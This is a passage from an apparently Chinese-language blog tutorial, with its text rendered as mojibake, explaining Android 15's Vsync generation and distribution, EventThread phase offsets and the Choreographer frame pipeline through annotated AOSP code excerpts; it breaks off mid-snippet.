<p><strong>ç³»åˆ—å¯¼èˆª</strong>: è¿™æ˜¯"Android 15 æ ¸å¿ƒå­ç³»ç»Ÿæ·±åº¦è§£æ"ç³»åˆ—çš„ç¬¬3ç¯‡æ–‡ç« ã€‚å»ºè®®å…ˆé˜…è¯»å‰ä¸¤ç¯‡äº†è§£æ˜¾ç¤ºç³»ç»ŸåŸºç¡€ã€‚</p>
</blockquote>
<h2 data-id="heading-1">ä¸€ã€Vsyncå‚ç›´åŒæ­¥æœºåˆ¶</h2>
<h3 data-id="heading-2">1.1 Vsyncçš„ä½œç”¨</h3>
<p>åœ¨ä¼ ç»Ÿçš„CRTæ˜¾ç¤ºå™¨æ—¶ä»£,ç”µå­æªä»å±å¹•å·¦ä¸Šè§’å¼€å§‹,é€è¡Œæ‰«æåˆ°å³ä¸‹è§’,å®Œæˆä¸€å¸§ç”»é¢çš„æ˜¾ç¤ºã€‚å½“ç”µå­æªå›åˆ°èµ·ç‚¹å‡†å¤‡ä¸‹ä¸€å¸§æ—¶,ä¼šå‘å‡ºä¸€ä¸ª"å‚ç›´åŒæ­¥ä¿¡å·"(Vsync),å‘Šè¯‰ç³»ç»Ÿ"ç°åœ¨å¯ä»¥å®‰å…¨åœ°æ›´æ–°å¸§ç¼“å†²äº†"ã€‚</p>
<p>è™½ç„¶ç°ä»£LCD/OLEDæ˜¾ç¤ºå™¨æ²¡æœ‰ç”µå­æª,ä½†Vsyncçš„æ¦‚å¿µè¢«å®Œæ•´ä¿ç•™ä¸‹æ¥,æˆä¸ºåŒæ­¥æ¸²æŸ“ç®¡çº¿çš„å…³é”®æœºåˆ¶ã€‚</p>
<p><strong>Vsyncè§£å†³çš„æ ¸å¿ƒé—®é¢˜</strong>:</p>
<ol>
<li>
<p><strong>ç”»é¢æ’•è£‚(Screen Tearing)</strong></p>
<ul>
<li>é—®é¢˜:GPUæ¸²æŸ“é€Ÿåº¦å¿«äºDisplayåˆ·æ–°,å¯¼è‡´ä¸€å¸§ç”»é¢æ˜¾ç¤ºäº†ä¸Šä¸‹ä¸¤ä¸ªä¸åŒçš„å†…å®¹</li>
<li>è§£å†³:Vsyncç¡®ä¿GPUæ¸²æŸ“å’ŒDisplayåˆ·æ–°åŒæ­¥è¿›è¡Œ</li>
</ul>
</li>
<li>
<p><strong>èµ„æºæµªè´¹</strong></p>
<ul>
<li>é—®é¢˜:GPUç›²ç›®é«˜é€Ÿæ¸²æŸ“,æµªè´¹CPU/GPUèµ„æºå’Œç”µé‡</li>
<li>è§£å†³:Vsyncè®©æ¸²æŸ“æŒ‰éœ€è¿›è¡Œ,æ¯ä¸ªVsyncå‘¨æœŸæœ€å¤šæ¸²æŸ“ä¸€å¸§</li>
</ul>
</li>
<li>
<p><strong>æµç¨‹åè°ƒ</strong></p>
<ul>
<li>é—®é¢˜:åº”ç”¨ç»˜åˆ¶ã€SurfaceFlingeråˆæˆã€Displayæ˜¾ç¤ºä¸‰ä¸ªç¯èŠ‚éœ€è¦ç²¾ç¡®é…åˆ</li>
<li>è§£å†³:Vsyncä½œä¸ºå…¨å±€æ—¶é’Ÿ,åè°ƒä¸‰è€…çš„å·¥ä½œèŠ‚å¥</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">1.2 Vsyncä¿¡å·çš„äº§ç”Ÿ</h3>
<p>Android 15çš„Vsyncä¿¡å·æœ‰ä¸¤ä¸ªæ¥æº:ç¡¬ä»¶Vsyncå’Œè½¯ä»¶Vsyncã€‚</p>
<h4 data-id="heading-4">ç¡¬ä»¶Vsync</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30b8e4841ca44b7db7aa5553f26bd1a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769434385&amp;x-signature=He5EirS%2FDVCeaEp2bOKE6XlbI%2Fo%3D" alt="03-01-vsync-generation-distribution.png" loading="lazy"/></p>
<p><strong>ç¡¬ä»¶Vsyncçš„äº§ç”Ÿè·¯å¾„</strong>:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">Display</span> Driver â†’ HWC (IComposerCallback::onVsync) â†’
SurfaceFlinger â†’ VSyncReactor â†’ VsyncSchedule
</code></pre>
<p>ç¡¬ä»¶Vsyncæ˜¯Display Driveråœ¨æ¯æ¬¡å®Œæˆä¸€å¸§æ‰«æåå‘å‡ºçš„çœŸå®ä¿¡å·,é€šè¿‡HWC 3.0çš„å›è°ƒæ¥å£ä¸ŠæŠ¥ç»™SurfaceFlingerã€‚</p>
<p>è®©æˆ‘ä»¬çœ‹çœ‹HWCå›è°ƒçš„æºç (ä½äº<code>hardware/interfaces/graphics/composer/aidl/android/hardware/graphics/composer3/IComposerCallback.aidl</code>):</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IComposerCallback</span> {
    <span class="hljs-comment">/**
     * ç¡¬ä»¶Vsyncå›è°ƒ
     * <span class="hljs-doctag">@param</span> display å‘ç”ŸVsyncçš„æ˜¾ç¤ºè®¾å¤‡ID
     * <span class="hljs-doctag">@param</span> timestamp Vsyncæ—¶é—´æˆ³(çº³ç§’)
     * <span class="hljs-doctag">@param</span> vsyncPeriodNanos Vsyncå‘¨æœŸ(çº³ç§’)
     */</span>
    oneway <span class="hljs-keyword">void</span> <span class="hljs-title function_">onVsync</span><span class="hljs-params">(<span class="hljs-type">long</span> display, <span class="hljs-type">long</span> timestamp, <span class="hljs-type">int</span> vsyncPeriodNanos)</span>;

    <span class="hljs-comment">/**
     * çƒ­æ’æ‹”å›è°ƒ
     */</span>
    oneway <span class="hljs-keyword">void</span> <span class="hljs-title function_">onHotplug</span><span class="hljs-params">(<span class="hljs-type">long</span> display, <span class="hljs-type">boolean</span> connected)</span>;

    <span class="hljs-comment">/**
     * åˆ·æ–°ç‡æ”¹å˜å›è°ƒ
     */</span>
    oneway <span class="hljs-keyword">void</span> <span class="hljs-title function_">onRefresh</span><span class="hljs-params">(<span class="hljs-type">long</span> display)</span>;
}
</code></pre>
<h4 data-id="heading-5">è½¯ä»¶Vsync</h4>
<p>ç¡¬ä»¶Vsyncè™½ç„¶å‡†ç¡®,ä½†é¢‘ç¹çš„ä¸­æ–­ä¼šå¸¦æ¥æ€§èƒ½å¼€é”€ã€‚Androidé‡‡ç”¨äº†ä¸€ç§èªæ˜çš„ä¼˜åŒ–ç­–ç•¥:</p>
<ol>
<li><strong>åˆå§‹é˜¶æ®µ</strong>: ä½¿ç”¨ç¡¬ä»¶Vsyncé‡‡æ ·,å»ºç«‹Vsyncæ¨¡å‹</li>
<li><strong>ç¨³å®šé˜¶æ®µ</strong>: å…³é—­ç¡¬ä»¶Vsync,ä½¿ç”¨<strong>VSyncPredictor</strong>åŸºäºå†å²æ•°æ®é¢„æµ‹ä¸‹ä¸€æ¬¡Vsync</li>
<li><strong>æ ¡å‡†é˜¶æ®µ</strong>: å®šæœŸä½¿ç”¨ç¡¬ä»¶Vsyncæ ¡å‡†é¢„æµ‹æ¨¡å‹</li>
</ol>
<p>è¿™ç§æ··åˆç­–ç•¥å…¼é¡¾äº†å‡†ç¡®æ€§å’Œæ€§èƒ½ã€‚</p>
<p><strong>VSyncPredictorçš„æ ¸å¿ƒé€»è¾‘</strong>(æºç ä½äº<code>frameworks/native/services/surfaceflinger/Scheduler/VSyncPredictor.cpp</code>):</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VSyncPredictor</span> : <span class="hljs-keyword">public</span> VsyncTracker {
    <span class="hljs-comment">// å†å²Vsyncæ—¶é—´æˆ³é˜Ÿåˆ—</span>
    std::deque&lt;<span class="hljs-type">nsecs_t</span>&gt; mTimestamps;

    <span class="hljs-comment">// é¢„æµ‹ä¸‹ä¸€æ¬¡Vsyncæ—¶é—´</span>
    <span class="hljs-function"><span class="hljs-type">nsecs_t</span> <span class="hljs-title">nextAnticipatedVSyncTimeFrom</span><span class="hljs-params">(<span class="hljs-type">nsecs_t</span> timePoint)</span> </span>{
        <span class="hljs-comment">// åŸºäºå†å²æ•°æ®è®¡ç®—Vsyncå‘¨æœŸ</span>
        <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> period = <span class="hljs-built_in">currentPeriod</span>();

        <span class="hljs-comment">// æ‰¾åˆ°timePointä¹‹åæœ€è¿‘çš„Vsyncæ—¶åˆ»</span>
        <span class="hljs-keyword">return</span> timePoint + period - (timePoint % period);
    }

    <span class="hljs-comment">// æ·»åŠ ç¡¬ä»¶Vsyncé‡‡æ ·,æ ¡å‡†æ¨¡å‹</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addVsyncTimestamp</span><span class="hljs-params">(<span class="hljs-type">nsecs_t</span> timestamp)</span> </span>{
        mTimestamps.<span class="hljs-built_in">push_back</span>(timestamp);

        <span class="hljs-comment">// ä¿ç•™æœ€è¿‘Nä¸ªæ ·æœ¬(é€šå¸¸20ä¸ª)</span>
        <span class="hljs-keyword">if</span> (mTimestamps.<span class="hljs-built_in">size</span>() &gt; mHistorySize) {
            mTimestamps.<span class="hljs-built_in">pop_front</span>();
        }

        <span class="hljs-comment">// é‡æ–°è®¡ç®—å‘¨æœŸ(å»é™¤å¼‚å¸¸å€¼)</span>
        <span class="hljs-built_in">recalculatePeriod</span>();
    }
};
</code></pre>
<h3 data-id="heading-6">1.3 Vsyncåˆ†å‘æœºåˆ¶</h3>
<p>SurfaceFlingeræ”¶åˆ°Vsyncä¿¡å·å,éœ€è¦åˆ†å‘ç»™ä¸¤ç±»æ¶ˆè´¹è€…:åº”ç”¨è¿›ç¨‹å’ŒSurfaceFlingerè‡ªå·±ã€‚ä½†è¿™ä¸¤è€…çš„éœ€æ±‚ä¸åŒ:</p>
<ul>
<li><strong>åº”ç”¨è¿›ç¨‹</strong>: éœ€è¦æå‰æ”¶åˆ°Vsync,ä»¥ä¾¿æœ‰è¶³å¤Ÿæ—¶é—´ç»˜åˆ¶(é€šå¸¸æå‰2ms)</li>
<li><strong>SurfaceFlinger</strong>: å‡†æ—¶æ”¶åˆ°Vsync,ç«‹å³å¼€å§‹åˆæˆ</li>
</ul>
<p>è¿™å°±æ˜¯<strong>Vsync Phase Offset</strong>(ç›¸ä½åç§»)æœºåˆ¶ã€‚</p>
<h4 data-id="heading-7">EventThread: App-Vsync vs SF-Vsync</h4>
<p>Androidç»´æŠ¤äº†ä¸¤ä¸ªEventThread:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// frameworks/native/services/surfaceflinger/SurfaceFlinger.cpp</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SurfaceFlinger::init</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// åˆ›å»ºapp-vsyncçš„EventThread,å¸¦-2ms offset</span>
    mAppConnectionHandle = mScheduler-&gt;<span class="hljs-built_in">createConnection</span>(
            <span class="hljs-string">"app"</span>, mFrameTimeline-&gt;<span class="hljs-built_in">getTokenManager</span>(),
            <span class="hljs-comment">/* workDuration */</span> configs.late.appWorkDuration,
            <span class="hljs-comment">/* readyDuration */</span> configs.late.sfWorkDuration);

    <span class="hljs-comment">// åˆ›å»ºsf-vsyncçš„EventThread,0ms offset</span>
    mSfConnectionHandle = mScheduler-&gt;<span class="hljs-built_in">createConnection</span>(
            <span class="hljs-string">"sf"</span>, mFrameTimeline-&gt;<span class="hljs-built_in">getTokenManager</span>(),
            <span class="hljs-comment">/* workDuration */</span> configs.late.sfWorkDuration,
            <span class="hljs-comment">/* readyDuration */</span> Duration::<span class="hljs-built_in">fromNs</span>(<span class="hljs-number">0</span>));
}
</code></pre>
<p><strong>æ—¶åºå…³ç³»</strong>:</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">çœŸå®Vsyncæ—¶åˆ»: T0</span>
  â†“
<span class="hljs-section">App-Vsyncè§¦å‘: T0 - 2ms (æå‰è§¦å‘)</span>
  â†“ (åº”ç”¨æœ‰2msæ—¶é—´å¼€å§‹ç»˜åˆ¶)
<span class="hljs-section">çœŸå®Vsyncåˆ°è¾¾: T0</span>
  â†“
<span class="hljs-section">SF-Vsyncè§¦å‘: T0 (å‡†æ—¶è§¦å‘)</span>
  â†“
SurfaceFlingerå¼€å§‹åˆæˆ
</code></pre>
<p>è¿™ä¸ª2msçš„æå‰é‡æ˜¯å¯é…ç½®çš„,å–å†³äºè®¾å¤‡æ€§èƒ½å’Œå±å¹•åˆ·æ–°ç‡ã€‚</p>
<h4 data-id="heading-8">EventThreadæºç åˆ†æ</h4>
<p>EventThreadè´Ÿè´£æ¥æ”¶Vsyncä¿¡å·å¹¶åˆ†å‘ç»™æ³¨å†Œçš„æ¶ˆè´¹è€…(æºç ä½äº<code>frameworks/native/services/surfaceflinger/Scheduler/EventThread.h</code>):</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventThread</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// åˆ›å»ºEventConnectionä¾›åº”ç”¨è¿æ¥</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> sp&lt;EventThreadConnection&gt; <span class="hljs-title">createEventConnection</span><span class="hljs-params">(
            EventRegistrationFlags eventRegistration = {})</span> <span class="hljs-type">const</span> </span>= <span class="hljs-number">0</span>;

    <span class="hljs-comment">// Vsyncå›è°ƒ,ç”±VsyncScheduleè§¦å‘</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">onVsync</span><span class="hljs-params">(<span class="hljs-type">nsecs_t</span> vsyncTime, <span class="hljs-type">nsecs_t</span> wakeupTime, <span class="hljs-type">nsecs_t</span> readyTime)</span></span>;

<span class="hljs-keyword">private</span>:
    <span class="hljs-comment">// çº¿ç¨‹ä¸»å¾ªç¯</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">threadMain</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-comment">// ç­‰å¾…Vsyncä¿¡å·</span>
            <span class="hljs-built_in">waitForVsyncSignal</span>();

            <span class="hljs-comment">// åˆ†å‘ç»™æ‰€æœ‰æ³¨å†Œçš„Connection</span>
            <span class="hljs-built_in">dispatchVsyncEvent</span>();
        }
    }

    <span class="hljs-comment">// å·²æ³¨å†Œçš„è¿æ¥åˆ—è¡¨</span>
    std::vector&lt;sp&lt;EventThreadConnection&gt;&gt; mConnections;
};
</code></pre>
<p>åº”ç”¨é€šè¿‡<code>DisplayEventReceiver</code>è¿æ¥åˆ°EventThread:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// åº”ç”¨ä¾§ä»£ç (Choreographerå†…éƒ¨)</span>
mDisplayEventReceiver = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DisplayEventReceiver</span>(
        Looper.<span class="hljs-built_in">myLooper</span>(), vsyncSource, configChanged);
</code></pre>
<blockquote>
<p><strong>å…³é”®è¦ç‚¹</strong>:</p>
<ul>
<li>ç¡¬ä»¶Vsyncå‡†ç¡®ä½†å¼€é”€å¤§,è½¯ä»¶Vsyncé¢„æµ‹æ•ˆç‡é«˜</li>
<li>Phase Offsetè®©åº”ç”¨æå‰æ”¶åˆ°Vsync,æœ‰æ›´å¤šæ—¶é—´ç»˜åˆ¶</li>
<li>EventThreadæ˜¯Vsyncåˆ†å‘çš„ä¸­æ¢,ç»´æŠ¤æ‰€æœ‰æ¶ˆè´¹è€…è¿æ¥</li>
</ul>
</blockquote>
<h3 data-id="heading-9">1.4 Android 15çš„Vsyncä¼˜åŒ–</h3>
<p>Android 15åœ¨Vsyncæœºåˆ¶ä¸Šè¿›è¡Œäº†å¤šé¡¹ä¼˜åŒ–:</p>
<p><strong>1. åŠ¨æ€åˆ·æ–°ç‡æ”¯æŒ(Variable Refresh Rate)</strong></p>
<p>Android 15æ”¯æŒæ ¹æ®å†…å®¹åŠ¨æ€è°ƒæ•´åˆ·æ–°ç‡:</p>
<ul>
<li>é™æ€å†…å®¹: é™ä½åˆ°30Hzæˆ–æ›´ä½,èŠ‚çœç”µé‡</li>
<li>åŠ¨ç”»/è§†é¢‘: æå‡åˆ°90Hz/120Hz,ä¿è¯æµç•…</li>
<li>æ¸¸æˆ: åŒ¹é…æ¸¸æˆå¸§ç‡,å‡å°‘judder</li>
</ul>
<p><strong>2. Vsyncé¢„æµ‹ç®—æ³•æ”¹è¿›</strong></p>
<p>å¼•å…¥æœºå™¨å­¦ä¹ æ¨¡å‹,åŸºäºå†å²æ•°æ®æ›´å‡†ç¡®åœ°é¢„æµ‹Vsync:</p>
<ul>
<li>è€ƒè™‘æ¸©åº¦å˜åŒ–å¯¹Displayåˆ·æ–°ç‡çš„å½±å“</li>
<li>è‡ªé€‚åº”è°ƒæ•´é¢„æµ‹çª—å£å¤§å°</li>
<li>æ›´å¿«åœ°æ£€æµ‹å’Œé€‚åº”åˆ·æ–°ç‡å˜åŒ–</li>
</ul>
<p><strong>3. VRRé…ç½®æ”¯æŒ</strong></p>
<p>æ–°å¢<code>VrrConfig</code>é…ç½®,å…è®¸HALå±‚ç²¾ç¡®æ§åˆ¶åˆ·æ–°ç‡:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">VrrConfig</span> {
    <span class="hljs-comment">// é€šçŸ¥SurfaceFlingerä¸‹ä¸€å¸§çš„æœŸæœ›presentæ—¶é—´</span>
    <span class="hljs-type">int</span> notifyExpectedPresentTime;
    <span class="hljs-comment">// æœ€å°å¸§é—´éš”(çº³ç§’)</span>
    <span class="hljs-type">int</span> minFrameInterval;
}
</code></pre>
<h2 data-id="heading-10">äºŒã€Choreographerä¸åº”ç”¨ä¾§æ¸²æŸ“</h2>
<h3 data-id="heading-11">2.1 Choreographerå·¥ä½œåŸç†</h3>
<p>Choreographer(ç¼–èˆè€…)æ˜¯Androidåœ¨åº”ç”¨ä¾§ä¸Vsyncäº¤äº’çš„æ¡¥æ¢,å®ƒåè°ƒè¾“å…¥ã€åŠ¨ç”»ã€ç»˜åˆ¶çš„æ‰§è¡Œæ—¶æœº,ç¡®ä¿å®ƒä»¬éƒ½åœ¨æ­£ç¡®çš„Vsyncè¾¹ç•Œä¸Šå‘ç”Ÿã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fe03c4d68e54146a39b87160fc0737b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769434385&amp;x-signature=DJYA9wSXuhyBf225pIDfP1xluZY%3D" alt="03-02-choreographer-workflow.png" loading="lazy"/></p>
<h4 data-id="heading-12">Choreographerçš„åˆå§‹åŒ–</h4>
<p>Choreographeré‡‡ç”¨çº¿ç¨‹æœ¬åœ°å•ä¾‹æ¨¡å¼,æ¯ä¸ªLooperçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„Choreographer:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// frameworks/base/core/java/android/view/Choreographer.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Choreographer</span> {
    <span class="hljs-comment">// ThreadLocalå­˜å‚¨,æ¯ä¸ªçº¿ç¨‹ä¸€ä¸ªå®ä¾‹</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;Choreographer&gt; sThreadInstance =
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;Choreographer&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> Choreographer <span class="hljs-title function_">initialValue</span><span class="hljs-params">()</span> {
            <span class="hljs-type">Looper</span> <span class="hljs-variable">looper</span> <span class="hljs-operator">=</span> Looper.myLooper();
            <span class="hljs-keyword">if</span> (looper == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"The current thread must have a looper!"</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Choreographer</span>(looper, VSYNC_SOURCE_APP);
        }
    };

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Choreographer</span><span class="hljs-params">(Looper looper, <span class="hljs-type">int</span> vsyncSource)</span> {
        mLooper = looper;
        mHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FrameHandler</span>(looper);

        <span class="hljs-comment">// åˆ›å»ºDisplayEventReceiveræ¥æ”¶Vsync</span>
        mDisplayEventReceiver = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FrameDisplayEventReceiver</span>(looper, vsyncSource);
    }
}
</code></pre>
<h3 data-id="heading-13">2.2 VSYNC â†’ doFrame â†’ drawçš„é“¾è·¯</h3>
<p>è®©æˆ‘ä»¬è·Ÿè¸ªä¸€ä¸ªå®Œæ•´çš„å¸§æ˜¯å¦‚ä½•ä»Vsyncä¿¡å·åˆ°è¾¾å±å¹•çš„:</p>
<h4 data-id="heading-14">æ­¥éª¤1: Vsyncåˆ°è¾¾</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrameDisplayEventReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DisplayEventReceiver</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onVsync</span><span class="hljs-params">(<span class="hljs-type">long</span> timestampNanos, <span class="hljs-type">long</span> physicalDisplayId,
                       <span class="hljs-type">int</span> frame, VsyncEventData vsyncEventData)</span> {
        <span class="hljs-comment">// Vsyncå›è°ƒåœ¨Displayçº¿ç¨‹,éœ€è¦åˆ‡æ¢åˆ°ä¸»çº¿ç¨‹</span>
        <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> Message.obtain(mHandler, MSG_DO_FRAME);
        msg.setAsynchronous(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å¼‚æ­¥æ¶ˆæ¯,ä¼˜å…ˆå¤„ç†</span>
        mHandler.sendMessageAtTime(msg, timestampNanos / TimeUtils.NANOS_PER_MS);
    }
}
</code></pre>
<h4 data-id="heading-15">æ­¥éª¤2: doFrameæ‰§è¡Œ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">doFrame</span><span class="hljs-params">(<span class="hljs-type">long</span> frameTimeNanos, <span class="hljs-type">int</span> frame, DisplayEventReceiver.VsyncEventData vsyncEventData)</span> {
    <span class="hljs-comment">// æ£€æŸ¥æ‰å¸§</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">jitterNanos</span> <span class="hljs-operator">=</span> frameTimeNanos - mLastFrameTimeNanos;
    <span class="hljs-keyword">if</span> (jitterNanos &gt;= mFrameIntervalNanos) {
        <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">skippedFrames</span> <span class="hljs-operator">=</span> jitterNanos / mFrameIntervalNanos;
        <span class="hljs-keyword">if</span> (skippedFrames &gt; SKIPPED_FRAME_WARNING_LIMIT) {
            Log.i(TAG, <span class="hljs-string">"Skipped "</span> + skippedFrames + <span class="hljs-string">" frames!  "</span>
                    + <span class="hljs-string">"The application may be doing too much work on its main thread."</span>);
        }
    }

    mLastFrameTimeNanos = frameTimeNanos;

    <span class="hljs-comment">// ä¾æ¬¡æ‰§è¡Œ4ç§ç±»å‹çš„Callback</span>
    doCallbacks(Choreographer.CALLBACK_INPUT, frameTimeNanos);     <span class="hljs-comment">// è¾“å…¥äº‹ä»¶</span>
    doCallbacks(Choreographer.CALLBACK_ANIMATION, frameTimeNanos); <span class="hljs-comment">// åŠ¨ç”»</span>
    doCallbacks(Choreographer.CALLBACK_TRAVERSAL, frameTimeNanos); <span class="hljs-comment">// éå†(ç»˜åˆ¶)</span>
    doCallbacks(Choreographer.CALLBACK_COMMIT, frameTimeNanos);    <span class="hljs-comment">// æäº¤</span>
}
</code></pre>
<h4 data-id="heading-16">æ­¥éª¤3: Viewéå†</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// CALLBACK_TRAVERSALä¼šè§¦å‘ViewRootImplçš„performTraversals</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">performTraversals</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// æµ‹é‡</span>
    <span class="hljs-keyword">if</span> (mFirst || windowShouldResize) {
        performMeasure(childWidthMeasureSpec, childHeightMeasureSpec);
    }

    <span class="hljs-comment">// å¸ƒå±€</span>
    <span class="hljs-keyword">if</span> (didLayout) {
        performLayout(lp, mWidth, mHeight);
    }

    <span class="hljs-comment">// ç»˜åˆ¶</span>
    <span class="hljs-keyword">if</span> (!cancelDraw) {
        performDraw();
    }
}
</code></pre>
<h4 data-id="heading-17">æ­¥éª¤4: ç¡¬ä»¶åŠ é€Ÿç»˜åˆ¶</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performDraw</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (mAttachInfo.mThreadedRenderer != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// ä½¿ç”¨RenderThreadè¿›è¡Œç¡¬ä»¶åŠ é€Ÿç»˜åˆ¶</span>
        mAttachInfo.mThreadedRenderer.draw(mView, mAttachInfo, <span class="hljs-built_in">this</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è½¯ä»¶ç»˜åˆ¶(å¾ˆå°‘ä½¿ç”¨)</span>
        draw(fullRedrawNeeded);
    }
}
</code></pre>
<p><strong>ThreadedRenderer</strong>(RenderThread)æ˜¯Androidçš„GPUæ¸²æŸ“çº¿ç¨‹,å®ƒä¸UIçº¿ç¨‹å¹¶è¡Œå·¥ä½œ:</p>
<ul>
<li>UI Thread: æ„å»ºDisplayList(ç»˜åˆ¶æŒ‡ä»¤åˆ—è¡¨)</li>
<li>RenderThread: æ‰§è¡ŒDisplayList,è°ƒç”¨OpenGL/Vulkanè¿›è¡ŒGPUæ¸²æŸ“</li>
</ul>
<h3 data-id="heading-18">2.3 å¸§ç‡æ§åˆ¶æœºåˆ¶</h3>
<p>Choreographeræä¾›äº†çµæ´»çš„å¸§ç‡æ§åˆ¶:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¯·æ±‚ä¸‹ä¸€æ¬¡Vsyncå›è°ƒ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postFrameCallback</span><span class="hljs-params">(FrameCallback callback)</span> {
    postFrameCallbackDelayed(callback, <span class="hljs-number">0</span>);
}

<span class="hljs-comment">// å»¶è¿ŸNæ¯«ç§’åè¯·æ±‚Vsyncå›è°ƒ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postFrameCallbackDelayed</span><span class="hljs-params">(FrameCallback callback, <span class="hljs-type">long</span> delayMillis)</span> {
    postCallbackDelayedInternal(CALLBACK_ANIMATION, callback, FRAME_CALLBACK_TOKEN, delayMillis);
}

<span class="hljs-comment">// è®¾ç½®Vsyncé€Ÿç‡(é™é¢‘)</span>
<span class="hljs-comment">// rate=2è¡¨ç¤ºæ¯2ä¸ªVsyncæ‰§è¡Œä¸€æ¬¡(30fps on 60Hz display)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setVsyncRate</span><span class="hljs-params">(<span class="hljs-type">int</span> rate)</span> {
    mFPSDivisor = rate;
}
</code></pre>
<h3 data-id="heading-19">2.4 æ‰å¸§æ£€æµ‹ä¸å›è°ƒ</h3>
<p>Choreographerå†…ç½®äº†æ‰å¸§æ£€æµ‹æœºåˆ¶:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">doFrame</span><span class="hljs-params">(<span class="hljs-type">long</span> frameTimeNanos, <span class="hljs-type">int</span> frame, DisplayEventReceiver.VsyncEventData vsyncEventData)</span> {
    <span class="hljs-comment">// è®¡ç®—è·ç¦»ä¸Šä¸€å¸§çš„æ—¶é—´å·®</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">jitterNanos</span> <span class="hljs-operator">=</span> frameTimeNanos - mLastFrameTimeNanos;

    <span class="hljs-comment">// å¦‚æœè¶…è¿‡ä¸€ä¸ªVsyncå‘¨æœŸ,è¯´æ˜æ‰å¸§äº†</span>
    <span class="hljs-keyword">if</span> (jitterNanos &gt;= mFrameIntervalNanos) {
        <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">skippedFrames</span> <span class="hljs-operator">=</span> jitterNanos / mFrameIntervalNanos;

        <span class="hljs-comment">// è¶…è¿‡é˜ˆå€¼(é»˜è®¤30å¸§),è¾“å‡ºè­¦å‘Šæ—¥å¿—</span>
        <span class="hljs-keyword">if</span> (skippedFrames &gt;= SKIPPED_FRAME_WARNING_LIMIT) {
            Log.i(TAG, <span class="hljs-string">"Skipped "</span> + skippedFrames + <span class="hljs-string">" frames!  "</span>
